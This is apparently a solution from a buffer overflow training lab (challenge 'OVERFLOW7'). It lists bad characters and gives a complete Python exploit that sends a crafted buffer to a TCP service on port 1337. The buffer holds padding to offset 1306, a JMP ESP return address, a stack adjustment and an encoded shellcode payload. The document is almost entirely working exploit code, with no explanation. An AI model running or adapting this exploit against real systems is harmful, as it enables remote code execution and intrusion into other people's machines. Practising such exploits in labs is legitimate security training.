# Buffer overflow 7

Badchars: `\x00\x8c\xae\xbe\xfb`

## Exploit code

```python
#!/usr/bin/env python3
import socket


ip = "MACHINE_IP"
port = 1337

buf_length = 1800
prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
jmp_esp = "\xd3\x11\x50\x62"

buffer = ""
buffer += prefix
buffer += overflow                      # Padding
buffer += jmp_esp                       # Overwriting saved return pointer
buffer += "\x83\xec\x10"                # NOP sled
buffer += ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x03\x84\xb2\x94\x83\xee\xfc\xe2\xf4\xff\x6c\x30\x94\x03\x84"
"\xd2\x1d\xe6\xb5\x72\xf0\x88\xd4\x82\x1f\x51\x88\x39\xc6\x17"
"\x0f\xc0\xbc\x0c\x33\xf8\xb2\x32\x7b\x1e\xa8\x62\xf8\xb0\xb8"
"\x23\x45\x7d\x99\x02\x43\x50\x66\x51\xd3\x39\xc6\x13\x0f\xf8"
"\xa8\x88\xc8\xa3\xec\xe0\xcc\xb3\x45\x52\x0f\xeb\xb4\x02\x57"
"\x39\xdd\x1b\x67\x88\xdd\x88\xb0\x39\x95\xd5\xb5\x4d\x38\xc2"
"\x4b\xbf\x95\xc4\xbc\x52\xe1\xf5\x87\xcf\x6c\x38\xf9\x96\xe1"
"\xe7\xdc\x39\xcc\x27\x85\x61\xf2\x88\x88\xf9\x1f\x5b\x98\xb3"
"\x47\x88\x80\x39\x95\xd3\x0d\xf6\xb0\x27\xdf\xe9\xf5\x5a\xde"
"\xe3\x6b\xe3\xdb\xed\xce\x88\x96\x59\x19\x5e\xec\x81\xa6\x03"
"\x84\xda\xe3\x70\xb6\xed\xc0\x6b\xc8\xc5\xb2\x04\x7b\x67\x2c"
"\x93\x85\xb2\x94\x2a\x40\xe6\xc4\x6b\xad\x32\xff\x03\x7b\x67"
"\xc4\x53\xd4\xe2\xd4\x53\xc4\xe2\xfc\xe9\x8b\x6d\x74\xfc\x51"
"\x25\xfe\x06\xec\x72\x3c\x73\x04\xda\x96\x03\x85\x09\x1d\xe5"
"\xee\xa2\xc2\x54\xec\x2b\x31\x77\xe5\x4d\x41\x86\x44\xc6\x98"
"\xfc\xca\xba\xe1\xef\xec\x42\x21\xa1\xd2\x4d\x41\x6b\xe7\xdf"
"\xf0\x03\x0d\x51\xc3\x54\xd3\x83\x62\x69\x96\xeb\xc2\xe1\x79"
"\xd4\x53\x47\xa0\x8e\x95\x02\x09\xf6\xb0\x13\x42\xb2\xd0\x57"
"\xd4\xe4\xc2\x55\xc2\xe4\xda\x55\xd2\xe1\xc2\x6b\xfd\x7e\xab"
"\x85\x7b\x67\x1d\xe3\xca\xe4\xd2\xfc\xb4\xda\x9c\x84\x99\xd2"
"\x6b\xd6\x3f\x52\x89\x29\x8e\xda\x32\x96\x39\x2f\x6b\xd6\xb8"
"\xb4\xe8\x09\x04\x49\x74\x76\x81\x09\xd3\x10\xf6\xdd\xfe\x03"
"\xd7\x4d\x41")
buffer += "D" * (buf_length - (len(buffer) - len(prefix)))      # Trailing padding
buffer += "\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
    s.send(bytes(buffer, "latin-1"))
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```
